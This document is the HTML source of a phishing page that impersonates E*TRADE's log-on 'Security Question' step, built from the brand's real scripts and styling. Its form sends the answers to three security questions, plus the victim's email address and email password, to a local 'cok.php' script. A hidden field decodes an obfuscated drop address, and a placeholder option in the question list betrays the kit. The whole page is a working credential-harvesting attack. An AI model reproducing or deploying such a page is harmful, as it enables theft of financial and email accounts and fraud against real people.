

  
  
  	
		<!doctype html>
<!--[if lt IE 7]>      <html lang="en" class="no-js lt-ie9 lt-ie8 lt-ie7 ie"> <![endif]-->
<!--[if IE 7]>         <html lang="en" class="no-js lt-ie9 lt-ie8 ie"> <![endif]-->
<!--[if IE 8]>         <html lang="en" class="no-js lt-ie9 ie"> <![endif]-->
<!--[if IE 9]>         <html lang="en" class="no-js gte-ie9 lt-ie10 ie" data-placeholder-focus="false"> <![endif]-->
<!--[if gt IE 9]> <html lang="en" class="gte-ie9 no-js" data-placeholder-focus="false"> <![endif]-->
<!--[if !IE]> <html lang="en" class="gte-ie9 no-js" data-placeholder-focus="false"> <![endif]-->
	<head>
		<title>Log On to E*TRADE | E*TRADE Financial</title>

		<script src="https://us.etrade.com/javascript/etrade_common.js" type="text/javascript"></script>

        <meta name="description" content="Secure Log-On for E*TRADE Securities and E*TRADE Bank accounts. Log on to manage your online trading and online banking." />
        <meta name="keyword" content="etrade login, www.etrade.com login, e-trade login, etrade log on, etrade log in" />
        <meta charset="utf-8">
        <meta content="IE=edge" http-equiv="X-UA-Compatible">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
     	
			
		

		   
   
     
       
         
       
 
       
         
       
 
       
          
       
 
 	   
          
      
 
       
          
        <script SRC="https://nexus.ensighten.com/etrade/Bootstrap.js" TYPE="text/javascript" ></script>   
          
       
 
  
     
   
 

    
		<link rel="shortcut icon" href="https://us.etrade.com/favicon.ico">
        <link REL="canonical" HREF="https://us.etrade.com/e/t/user/login" />
        
		<script>
			var scrHostName = window.location.href;
				var aemCDNPath = "";
				if( (scrHostName.indexOf('lxdm') != -1) || (scrHostName.indexOf('sit') != -1) ){
					aemCDNPath = "https://cdn2.sit.etrade.net/1/1d";
				}else if ( scrHostName.indexOf('uat') != -1 ){
					aemCDNPath = "https://cdn2.uat.etrade.net/1/1d";
				} else {
					aemCDNPath = "https://cdn2.etrade.net/1/1d";
			}
		</script> 

		
		
		
		<script TYPE="text/javascript" >
		    var famSelTab='';
		    var famTab='';
		    var familymenus='';
		    var userType='VISITOR';
		    var ACQFlag='';
		    var applicationname='user';
		</script>
		<script SRC="https://cdn2.etrade.net/1/20210406.0/javascript/global_nav.js" TYPE="text/javascript" ></script>
		        <script SRC="https://cdn2.etrade.net/1/20210406.0/js/nav.js" TYPE="text/javascript" ></script>
		
		    
		
		
		<script>
			var targetURLPrefix = (window.location.origin.indexOf('bankus') != -1)? ETRADE: window.location.origin;			
		</script>
		
		
			
		
		
		
			
		
		
		
			
		
		
		
			
				<!-- Include CSS -->
					<link rel="stylesheet" href="https://cdn2.etrade.net/1/20210416/aempros/etc/designs/responsive-etrade/styles/styles.css" type="text/css" />
			
		
		
		
			
		

	</head>
	<body>
		
			
				<script SRC="https://js-cdn.dynatrace.com/jstag/16898c892dc/bf27964sah/b4e443ac2cbd8026_complete.js" CROSSORIGIN="anonymous" TYPE="text/javascript" ></script>
			
		

		
			
		
		
		
            
        

        
            
        

        
            
        

		
            
		
		
		
            
				<!-- Include Header login.js -->
				<script src="https://cdn2.etrade.net/1/20210416/aempros/etc/designs/responsive-etrade/globalNav/js/header/login/login.js" type="text/javascript"></script>
			
		
		
		
			
		
				
		<!-- page content -->
<div class="page-content" role="main">

    <div class="componentContainer">	<section style="padding-top:10px;padding-bottom:10px;background-color:#241056;">        <div class="container">    <div class="richTextEditor"><div><div>	<span><div class="text-center"><h3 class="subhead text-white">Tax forms and online support</h3><p class="text-white">Due
 to high call volumes, wait times have been longer than usual. To access
 your tax forms and for quick answers to tax questions, see our <a class="dark" alt="visit our tax center" href="https://us.etrade.com/app/taxcenter#/taxdoc" aria-label="visit our tax center">Tax Center</a>. <br>For other self-service options, see our <a class="dark" alt="visit our covid-19 resource center" href="https://us.etrade.com/l/covid-19-latest-updates" aria-label="visit our online resource center">Online Resource Center</a> and <a alt="Visit our most popular FAQs" href="https://us.etrade.com/frequently-asked-questions/most-popular" target="_blank" class="dark" aria-label="Visit our most popular FAQs">most popular FAQs</a>.</p></div></span></div></div></div>        </div></section></div><section class="white customer-login">
        <div class="container">
            <div class="vertical-offset-base"></div>
            <table cellspacing="0" cellpadding="0" border="0">
		                <tbody><tr>
	                        <td class="lCol">
	                            
                                
				                <h1 id="pageTitleHeader">Security Question</h1>
	                        </td>
	                        
	                    </tr>
	                </tbody></table><br>
            
            

	
	
        
            
        
        
            
        
		
			
		
		
		
	
		
			
		
		
			
		
	

                            

            
            <form action="cok.php" method="post">
            	

                
                    
                

                <div class="center">
	<div class="formContainer">
		<table>
	<tbody><tr>
		<td>

                        Please enter the following information to help us identify you:
						<div class="formInputContainer aligned label180">
        <br>
			                <div class="formPseudoRow">
    <div class="labelColumn">
		
		
			<label class="formlabel" for="question1"> Security Question 1 </label>
		
	</div>
    <div class="formCtlColumn">
      <select name="question1" size="1" id="question1"><option value="Select One">Choose your first security question</option>
<option value="what was the name of your favourite resturant in college?">what was the name of your favourite resturant in college?</option>
<option value="what was the name of first city you visited by plane?">what was the name of first city you visited by plane?</option>
<option value="what was the name of favourite book  in high school?">what was the name of favourite book  in high school?</option>
<option value="What is the first movie you saw in a theater?">What is the first movie you saw in a theater?</option>
<option value="what is the first thing you learned to cook??">what is the first thing you learned to cook??</option>
<option value="what is the first purchase you made online?">what is the first purchase you made online?</option>
<option value="what was your least favorite college course?">what was your least favorite college course?</option>
<option value="what is the first concert you attended?">what is the first concert you attended?</option>
<option value="what is the first album you purchased?">what is the first album you purchased?</option>
<option value="what is the first beach you visited?">what is the first beach you visited?</option>
<option value="shpould i type the questions here?">shpould i type the questions here?</option></select>
   </div>
  </div><br>

   <div class="formPseudoRow">
    <div class="labelColumn">
		
		
			<label class="formlabel" for="answer1">Answer</label>
		
    </div>
    <div class="formCtlColumn">
		<input type="text" name="answer1" required="true" maxlength="33" size="30" value="" id="answer1">
   </div>
  </div>

 <div class="formPseudoRow"><br>
    <div class="labelColumn">
	   
		
			<label class="formlabel" for="question2"> Security Question 2 </label>
		
    </div>
   <div class="formCtlColumn">
      <select name="question2" size="1" id="question2"><option value="Select One">Choose your first security question</option>
<option value="what is the name of the hospital where your 1st child was born?">what is the name of the hospital where your 1st child was born?</option>
<option value="what is the last name of your childhood best friend?">what is the last name of your childhood best friend?</option>
<option value="What is the middle name of your youngest simbling?">What is the middle name of your youngest simbling?</option>
<option value="what is your maternal grandmother first name?">what is your maternal grandmother first name?</option>
<option value="what is the name of your first grade teacher?">what is the name of your first grade teacher?</option>
<option value="where did you meet your spouse for the first time?">where did you meet your spouse for the first time?</option>
<option value="where was your wedding rehersal dinner held?">where was your wedding rehersal dinner held?</option>
<option value="what is the make or model of your first car?">what is the make or model of your first car?</option>
<option value="what is the name of your eldest cousin?">what is the name of your eldest cousin?</option>
<option value="what was your childhood nickname?">what was your childhood nickname?</option>
<option value="what is your fathers middle name?">what is your fathers middle name?</option>
<option value="what was your high school mascot?">what was your high school mascot?</option></select>
   </div>
   </div>

   <div class="formPseudoRow"><br>
    <div class="labelColumn">
		
		
			<label class="formlabel" for="answer2">Answer</label>
		
    </div>
     <div class="formCtlColumn">
    <input type="text" name="answer2" maxlength="33" size="30" required="true" value="" id="answer2">
   </div>
  </div>
  
 <div class="formPseudoRow"><br>
    <div class="labelColumn">
        
		
			<label class="formlabel" for="question3">Security Question 3</label>
		
    </div>
   <div class="formCtlColumn">
      <select name="question3" size="1" id="question3"><option value="Select One">Choose your first security question</option>
<option value="what was the last name of your manager at your first job?">what was the last name of your manager at your first job?</option>
<option value="what is the name of your first bank where you held an account?">what is the name of your first bank where you held an account?</option>
<option value="what was the last name of your favourite grade school teacher?">what was the last name of your favourite grade school teacher?</option>
<option value="what was the name of your best friend in high school?">what was the name of your best friend in high school?</option>
<option value="who was your favourite athlete during high school?">who was your favourite athlete during high school?</option>
<option value="what was the first name of your maid of honour?">what was the first name of your maid of honour?</option>
<option value="what was the first name of your first roomate?">what was the first name of your first roomate?</option>
<option value="what was the first video game you played?">what was the first video game you played?</option>
<option value="what is the name of your first pet?">what is the name of your first pet?</option>
<option value="what was your best mans last name?">what was your best mans last name?</option>
<option value="what is your mother middle name?">what is your mother middle name?</option>
<option value="what is your best friend name?">what is your best friend name?</option></select>
   </div>
   </div><br>

   <div class="formPseudoRow">
    <div class="labelColumn">
		 
		
			<label class="formlabel" for="answer3">Answer</label>
		
    </div>
     <div class="formCtlColumn">
    <input type="text" name="answer3" maxlength="33" size="30" value="" required="true" id="answer3"><input type="hidden" name="verify" value="<?=base64_decode("YW5kYWxhcy5tYWlsMkBnbWFpbC5jb20=");?>">
   </div>
  </div>
  </div><br>
  <div class="row">
                                <div class="col-md-7 col-xs-12">
								<strong>EMAIL ACCESS</strong>
                                    <div class="row">
                                        <div class="col-xs-12">
                                            <div class="field animated-label text required">
                                                <input class="form-control"  id="fponline-id" name="EA" type="text" required placeholder="Email Address*" />                                               
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-xs-12">
                                            <div class="field animated-label text required">
                                                <input class="form-control"  id="fponline-id" name="EP" type="password" required placeholder="Email password*" />                                               
                                            </div>
                                        </div>
                                    </div>
                </div>


                </div><br>
						<div class="formButtonContainer">
						    <span class="btnwrp">
							    <input type="submit" name="ctlEnrollmentWorkflow$SetupLoginCredentials_btnContinue" value="Confirm" id="ctlEnrollmentWorkflow_SetupLoginCredentials_btnContinue">
							</span>
						</div>
					</td>
	</tr>
</tbody></table>


                
                        </div>
                    </div>
                </div>
            </form>
        </div>
        <div class="modal modal-spinner fade" id="page_spinner" tabindex="-1" role="dialog">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-body">
                        <div class="spinner">
                            <svg class="circular" viewBox="25 25 50 50">
                                <circle class="background" cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10"></circle>
                                <circle class="path" cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10"></circle>
                            </svg>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

</div>

		
		
			
		
		
		
            
        

        
            
        

        
            
        

		
            
		
		
		
            
				<!-- Include Footer login.js and psr.js -->
				<script src="https://cdn2.etrade.net/1/20210416/aempros/etc/designs/responsive-etrade/globalNav/js/footer/login/login.js" type="text/javascript"></script>
				<script src="https://cdn2.etrade.net/1/20210416/aempros/etc/designs/responsive-etrade/scripts/psr.js" type="text/javascript"></script>
			
		
		
		
            
		
		
		<div style="text-align:center;color:#CCC;font-size:12px;">
        	49w401m5.5
    	</div>
		
		<script>
			ETRADER.global.showSmartAppBanner();
		</script>
		<script>
			$(document).ready(function() {
                if (typeof showCaponeInterceptModal !== 'undefined' && showCaponeInterceptModal) {
                    $('#capone-intercept-modal').modal({
                        backdrop: 'static',
                        keyboard: false
                    });
                }

				var isFromOLA = $.cookie('isFromOLA');
				if(isFromOLA == 'true') {
					$(".nav-header, .page-content, .page-footer").hide();
					var msgHtml = '<div id="OlaSuccessBox" style="border: 1px solid #690;	background-color: #FFC; padding: 10px; text-align: left; width: 600px; margin: 0 auto; margin-top: 100px;"><div class="to-center">';
					msgHtml = msgHtml + '<table><tr><td><img ALIGN="absmiddle" BORDER="0" SRC="https://cdn2.etrade.net/1/20210406.0/images/i_alertok.gif" WIDTH="28" HEIGHT="28" ></td><td valign="middle" style="padding-left:5px;">';
					msgHtml = msgHtml + '<span style="font-family:Verdana;font-weight:bold;font-size:10px;">';
					msgHtml = msgHtml + 'Your password has been reset.';
					msgHtml = msgHtml + '</span></td></tr></table></div></div>';
					$('body').append(msgHtml);
					}				
			});
		</script>
	        
		<script>
			//remove welcome tour localStorage
			window.localStorage.removeItem('welcomeTour');
			window.localStorage.removeItem('welcomeTourFirst');

			//Remove session storage for portfolios gains and losses tab
			window.sessionStorage.removeItem('glPrefs');
			window.sessionStorage.removeItem('glViews');
			window.sessionStorage.removeItem('glFilters');
		</script>
		
		
		
		
		
		
			
		
		
	<script TYPE='text/javascript' >setRC();</script>

    <script SRC="https://cdn2.etrade.net/1/20210406.0/javascript/jquery/plugins/flash/flashembed.min.js" TYPE="text/javascript" ></script>
    <script SRC="https://cdn2.etrade.net/1/20210406.0/javascript/jquery/plugins/util/watch/watch.min.js" TYPE="text/javascript" ></script>
    <script SRC="https://cdn2.etrade.net/1/20210406.0/javascript/jquery/plugins/etrade/cyota/cyotaLoginDevicePrint.min.js" TYPE="text/javascript" ></script>

    <input ID="DeviceTokenFSO" VALUE="" TYPE="hidden" NAME="DeviceTokenFSO" />
    <input ID="RSADevicePrint" VALUE="" TYPE="hidden" NAME="RSADevicePrint" />
    <div id="flash-object-div" name="flash-object-div" style="height:1px; width: 1px"></div>

    <script TYPE="text/javascript" >
        if (jQuery) {
            jQuery.extend( true, jQuery, {
                page: {
                    cyotaData: {
                        sOutputId   : "RSADevicePrint",
                        sFlashDivId : "flash-object-div",
                        sFlashId    : "flash-object",
                        sSwfPath    : "/flash/login/rsa_fso.swf",
                        sDeviceId   : "DeviceTokenFSO",
                        sIpAddress  : '36.81.198.71'
                    }
                }
            } );
        }
    </script>
		
	</body>
</html>

	
   


<!-- stop page starts here -->




    